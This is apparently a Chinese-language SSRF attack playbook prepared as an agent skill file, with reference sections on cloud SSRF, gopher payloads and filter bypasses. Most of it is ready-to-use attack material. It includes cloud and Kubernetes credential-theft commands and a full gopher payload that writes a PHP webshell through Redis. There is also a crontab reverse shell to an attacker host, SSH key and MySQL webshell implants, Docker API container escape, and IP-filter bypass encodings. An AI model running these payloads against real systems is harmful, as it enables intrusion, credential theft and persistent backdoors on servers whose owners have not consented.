# ssrf-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# SSRF 攻击方法论

## 深入参考

- IP 过滤绕过完整列表、云元数据路径、协议利用详细命令 → [references/ssrf-bypass.md](references/ssrf-bypass.md)
- 云 SSRF 进阶（容器/Serverless 凭据/K8s 横向/绕过技术） → [references/cloud-ssrf.md](references/cloud-ssrf.md)
- Gopher 协议 payload 生成与实战组合链 → [references/gopherus-payloads.md](references/gopherus-payloads.md)

---

## Phase 1: 发现 SSRF 入口

**参数名线索**（高度可疑）：
`url`, `uri`, `path`, `src`, `dest`, `redirect`, `callback`, `next`, `data`, `reference`, `site`, `html`, `imageUrl`, `feed`, `target`, `proxy`, `link`

**功能线索**：URL 预览、PDF/图片生成（wkhtmltopdf, puppeteer）、Webhook、远程图片获取、RSS 导入

## Phase 2: 基础 SSRF 验证

```
url=http://127.0.0.1/
url=http://localhost/
url=http://127.0.0.1:PORT/
```

响应差异判断：内容变化 → 有回显 SSRF | 只有状态码 → 半盲 | 无差异 → 全盲

**陷阱**：应用可能过滤 `127.0.0.1` 但放行变体 → 需要绕过（[references/ssrf-bypass.md](references/ssrf-bypass.md)）

## Phase 3: 协议利用速查

```
url=file:///etc/passwd       # 文件读取（最高价值）
url=file:///flag.txt
url=gopher://127.0.0.1:6379/ # 攻击内部 Redis（⚠️ PHP curl 可用, Python requests 不可用）
url=dict://127.0.0.1:6379/info
```

## Phase 4: 云元数据速查

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/                 # GCP (需 Header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (需 Header)
```

## Phase 5: 利用决策树

```
SSRF 入口确认
├─ 有回显？ → 直接读内容/探测端口
│  ├─ file:// 可用？ → 读取敏感文件（/etc/passwd, /flag.txt, /app/config.py）
│  ├─ 云环境？ → 查询元数据获取凭据 → [references/ssrf-bypass.md](references/ssrf-bypass.md)
│  └─ 内网服务？ → 探测 Redis/ES/MongoDB → gopher 利用
├─ 半盲/全盲？
│  ├─ 端口扫描 → 状态码/响应时间差异
│  └─ 外带 → DNS 外带 / 延时差异
├─ IP 过滤？ → 编码绕过 → [references/ssrf-bypass.md](references/ssrf-bypass.md)
└─ 协议限制？ → 检查 HTTP-only vs 全协议
```

## 协议与库限制

不同实现支持的协议不同，不是所有 SSRF 都支持所有协议：

| 库/环境 | file:// | gopher:// | dict:// |
|---------|---------|-----------|---------|
| PHP curl | ✅ | ✅ | ✅ |
| Python requests | ❌ | ❌ | ❌ |
| Python urllib | ✅ | ❌ | ❌ |
| Java URLConnection | ✅ | ❌ | ❌ |
| Node.js fetch | ❌ | ❌ | ❌ |

**IP 短格式绕过**：`127.1`、`127.0.1`（省略 0）

## 注意事项

- **file:// 是最高价值协议**：直接读取服务器文件
- **Gopher 陷阱**：PHP curl 支持 gopher，Python requests 不支持
- **SSRF 和 XXE 经常组合**：XXE 中的 SYSTEM 就是 SSRF
- **PDF 生成器 SSRF**：wkhtmltopdf/puppeteer 生成 PDF 时会加载外部资源，注入 `<iframe src="file:///etc/passwd">` 或 `<img src="http://127.0.0.1/">`


---

## REF: cloud-ssrf

# 云环境 SSRF 进阶利用

> **基础元数据端点**（AWS/GCP/Azure/阿里云/腾讯云）和凭据提取完整流程见 `/skill:cloud-metadata`。本文档聚焦 SSRF 场景下的进阶利用：容器/Serverless 凭据、K8s 横向、绕过技术。

---

## 容器与 Serverless 凭据

### ECS 容器凭据

ECS Task 凭据端点不同于 EC2 IMDS，需先通过环境变量或 LFI 获取相对路径：

```bash
# file:///proc/self/environ → 找到 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

### EKS Pod Identity 凭据

EKS 注入 `AWS_CONTAINER_CREDENTIALS_FULL_URI` 和 Token 文件，SSRF + LFI 组合可窃取：

```bash
AUTH=$(cat /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token)
curl -s -H "Authorization: $AUTH" "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
```

### Lambda 环境变量

Lambda 凭据在环境变量中，需通过 `file:///proc/self/environ` 提取 `AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`。运行时事件数据：

```bash
curl -s http://localhost:9001/2018-06-01/runtime/invocation/next
```

### Azure App Service / Functions

通过环境变量 `IDENTITY_ENDPOINT` 和 `IDENTITY_HEADER` 获取 Token：

```bash
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```

### GCP beta 端点（无需 Header）

```bash
# 无需 Metadata-Flavor: Google 头——在无法控制请求头的 SSRF 场景中关键
curl -s http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

### GCP Audience-bound Identity Token

用于访问私有 Cloud Run / IAP 后端：

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://TARGET.run.app"
```

---

## Kubernetes 横向利用

### Service Account Token

```bash
# 默认挂载路径
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 使用 Token 访问 API Server
curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### etcd 未授权访问

```bash
curl -s http://127.0.0.1:2379/version
curl -s http://127.0.0.1:2379/v2/keys/?recursive=true
```

### GKE kube-env 泄露

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

---

## SSRF 场景下的元数据绕过

### 无 Header SSRF 可用端点

当 SSRF 无法携带自定义 Header 时：

| 云平台 | 可用端点 | 说明 |
|--------|---------|------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | 无需 Header |
| GCP v1beta1 | `http://metadata.google.internal/computeMetadata/v1beta1/` | 无需 `Metadata-Flavor` |
| Azure instanceinfo | `http://169.254.169.254/metadata/v1/instanceinfo` | 无需 `Metadata: true` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | 无需 Header |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 无需 Header |

### DNS Rebinding 绕过

域名先解析到公网 IP 通过 SSRF 过滤检查，TTL 过期后 Rebinding 到 `169.254.169.254`：

```bash
# Singularity
python3 singularity.py --lhost <your_ip> --rhost 169.254.169.254 \
  --domain rebinder.test --http-port 8080

# 简易测试: rbndr.us, lock.cmpxchg8b.com
```

### IPv6 与编码变体

```http
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
http://2852039166/latest/meta-data/           # 十进制
http://0xa9fea9fe/latest/meta-data/           # 十六进制
http://0251.0376.0251.0376/latest/meta-data/  # 八进制
```

### 302 重定向绕过 Header 限制

自控服务器返回 302 到元数据端点，某些 HTTP 客户端跟随重定向时可能保留原始 Header 或丢弃 `Host` 头但携带 Cookie。

### IMDSv2 绕过条件

IMDSv2 的 PUT + Token 机制在以下场景可被绕过：
- SSRF 支持任意 HTTP 方法（PUT）且可设置自定义 Header
- 应用内部已有 Token 缓存（通过 LFI 读取缓存文件）
- 容器/Pod 场景下 hop limit=1 可能阻止跨容器访问


---

## REF: gopherus-payloads

# Gopherus Gopher 协议 Payload 参考

## gopher:// URL 编码规则

- `\r\n` → `%0d%0a`
- payload 需双重 URL 编码（浏览器/curl 解码一层，gopher 协议解码一层）
- URL 格式：`gopher://$TARGET_IP:$PORT/_{payload}`
- `/_` 中的 `_` 是 gopher 协议的 type indicator，实际不发送，后面才是真正 payload

**双重编码示例：**

```
原始:    *1\r\n$4\r\nINFO\r\n
一次编码: *1%0d%0a$4%0d%0aINFO%0d%0a
二次编码: *1%250d%250a%244%250d%250aINFO%250d%250a
```

---

## Redis（最常见）

```bash
gopherus --exploit redis
```

### 写 Webshell

通过 CONFIG SET 修改 dir/dbfilename，再 SET payload 写入文件：

```
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$1%0D%0A1%0D%0A$28%0D%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0ASAVE%0D%0A
```

### 写 Crontab 反弹 Shell

```
*/1 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
```

Redis 命令序列：

```
FLUSHALL
SET 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

### 写 SSH authorized_keys

```
FLUSHALL
SET 1 "\n\n$SSH_PUBLIC_KEY\n\n"
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE
```

### 手工 RESP 协议构造

RESP 协议格式：`*参数数量\r\n$字节长度\r\n参数值\r\n`

```
*1\r\n$8\r\nflushall\r\n
*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$PAYLOAD_LEN\r\n$PAYLOAD\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$DIR_LEN\r\n$DIR_PATH\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$FILENAME_LEN\r\n$FILENAME\r\n
*1\r\n$4\r\nSAVE\r\n
```

**Python 辅助生成脚本：**

```python
import urllib.parse

def gen_redis_gopher(cmds):
    payload = ""
    for cmd in cmds:
        parts = cmd.split(" ")
        payload += f"*{len(parts)}\r\n"
        for p in parts:
            payload += f"${len(p)}\r\n{p}\r\n"
    return "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
```

---

## MySQL

```bash
gopherus --exploit mysql
```

- 利用无密码认证发送 SQL payload
- 典型 payload：`SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'`

**前置条件：**
- MySQL 允许无密码本地登录（空密码 root）
- `--skip-grant-tables` 或弱配置
- `secure_file_priv` 未限制或为空

**原理：** 构造 MySQL 客户端认证握手包 + COM_QUERY 包，通过 gopher 发送到 3306 端口

---

## FastCGI

```bash
gopherus --exploit fastcgi
```

- 通过修改 `PHP_VALUE` 注入 `auto_prepend_file` 实现 PHP 代码执行
- 可绕过 `disable_functions` 和 `open_basedir`（通过 PHP_ADMIN_VALUE）

**前置条件：**
- PHP-FPM 监听 TCP 端口（默认 9000）或 Unix socket
- 已知服务器上一个 .php 文件的绝对路径（如 `/var/www/html/index.php`）

**典型 FastCGI 参数：**

```
SCRIPT_FILENAME: /var/www/html/index.php
PHP_VALUE: auto_prepend_file = php://input
```

---

## PostgreSQL

```bash
gopherus --exploit postgresql
```

- 构造 PostgreSQL 协议包执行 SQL
- 可用于写文件（`COPY ... TO`）或命令执行（`CREATE EXTENSION`）

**前置条件：**
- PostgreSQL 信任本地连接（`pg_hba.conf` 中 trust 认证）
- 默认端口 5432

---

## SMTP

```bash
gopherus --exploit smtp
```

- 构造 SMTP 协议命令发送邮件
- 可用于钓鱼邮件发送（社工联动）

**SMTP 命令序列：**

```
HELO $HOSTNAME\r\n
MAIL FROM:<$FROM_ADDR>\r\n
RCPT TO:<$TO_ADDR>\r\n
DATA\r\n
Subject: $SUBJECT\r\n
\r\n
$BODY\r\n
.\r\n
QUIT\r\n
```

---

## Zabbix

```bash
gopherus --exploit zabbix
```

- 构造 Zabbix Agent 协议包执行 `system.run` 命令
- 默认端口 10050

**前置条件：**
- Zabbix Agent 未限制来源 IP（`Server=` 配置宽泛）
- `EnableRemoteCommands=1`

---

## 实战组合链

| 攻击链 | 目标端口 | 效果 |
|--------|---------|------|
| SSRF → gopher://127.0.0.1:6379 → Redis 写 crontab | 6379 | 反弹 Shell |
| SSRF → gopher://127.0.0.1:6379 → Redis 写 webshell | 6379 | Web 后门 |
| SSRF → gopher://127.0.0.1:6379 → Redis 写 SSH key | 6379 | SSH 登录 |
| SSRF → gopher://127.0.0.1:9000 → FastCGI | 9000 | PHP 代码执行 |
| SSRF → gopher://127.0.0.1:3306 → MySQL | 3306 | UDF/写文件 |
| SSRF → gopher://127.0.0.1:5432 → PostgreSQL | 5432 | SQL 执行/写文件 |
| SSRF → gopher://127.0.0.1:25 → SMTP | 25 | 钓鱼邮件 |
| SSRF → gopher://127.0.0.1:10050 → Zabbix | 10050 | 命令执行 |

---

## 排错检查清单

- gopher 不通？检查库是否支持（仅 PHP curl / libcurl 可靠支持）
- Redis 写文件失败？检查目标目录权限、Redis 是否以 root 运行
- MySQL payload 无效？确认目标确实允许空密码登录
- FastCGI 执行失败？确认 PHP-FPM 端口、已知 .php 文件路径
- 双重编码问题？用 `curl -v` 调试确认实际发送的字节


---

## REF: ssrf-bypass

# SSRF IP 过滤绕过与协议利用

## IP 过滤绕过大全

当 `127.0.0.1` 和 `localhost` 被过滤时：

```
# 十进制
http://2130706433/          (127.0.0.1 的十进制)
http://0177.0.0.1/          (八进制)

# 十六进制
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# IPv6
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# 特殊域名
http://spoofed.burpcollaborator.net/   (解析到 127.0.0.1)
http://localtest.me/                    (解析到 127.0.0.1)
http://127.0.0.1.nip.io/

# URL 解析差异
http://127.0.0.1@attacker.com/        (@ 前面是 userinfo)
http://attacker.com#@127.0.0.1/
http://127.0.0.1%00@attacker.com/

# 重定向绕过（最可靠）
http://your-server.com/redirect?url=http://127.0.0.1/
```

## 内部服务探测

```
# 常见内部端口
http://127.0.0.1:80/     (Web)
http://127.0.0.1:8080/   (Tomcat/代理)
http://127.0.0.1:8000/   (Django/开发服务器)
http://127.0.0.1:3000/   (Node.js/Grafana)
http://127.0.0.1:5000/   (Flask)
http://127.0.0.1:6379/   (Redis - 可以 RCE!)
http://127.0.0.1:9200/   (Elasticsearch)
http://127.0.0.1:27017/  (MongoDB)
http://127.0.0.1:11211/  (Memcached)
```

## 云元数据（高价值！）

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
(需要 Header: Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
(需要 Header: Metadata: true)
```

## 协议利用

```
# 文件读取
url=file:///etc/passwd
url=file:///flag.txt
url=file:///app/app.py

# Gopher（可以攻击 Redis/MySQL/SMTP）
url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...

# Dict（探测内部服务）
url=dict://127.0.0.1:6379/info
```

**陷阱**：
- `file://` 可能被禁但 `FILE://` 或 `File://` 可能放行
- gopher 协议在 PHP curl 中默认可用，在 Python requests 中不可用
- 有些 SSRF 只支持 HTTP/HTTPS，不支持 file/gopher

## CTF 高级 SSRF 技巧

### SSRF → Docker API RCE 链
SSRF 探测到 `localhost:2375` (Docker API) 时，可读取容器文件并 RCE：
```bash
# 读取容器文件
curl "http://target/ssrf?url=http://localhost:2375/containers/<id>/archive?path=/flag"
# 创建恶意容器 + 执行命令
curl -X POST "http://target/ssrf?url=http://localhost:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/flag"],"HostConfig":{"Binds":["/:/host"]}}'
```

### URL 解析差异绕过白名单
PHP `parse_url()` 和 curl 对多 `@` URL 的解析不同：
```
http://what:ever@127.0.0.1:80@allowed.host/path
├─ parse_url() → host = allowed.host  (通过白名单)
└─ curl        → 连接到 127.0.0.1:80  (实际 SSRF)
```

### Rogue MySQL Server 文件读取
当 SSRF 可控 MySQL 连接地址时，搭建恶意 MySQL 服务器，利用 `LOAD DATA LOCAL INFILE` 读取客户端文件：
```python
# 恶意 MySQL 服务器回复 LOAD DATA LOCAL INFILE 请求
# 客户端 MySQL 库自动发送指定文件内容
# 工具: https://github.com/rmb122/rogue_mysql_server
```
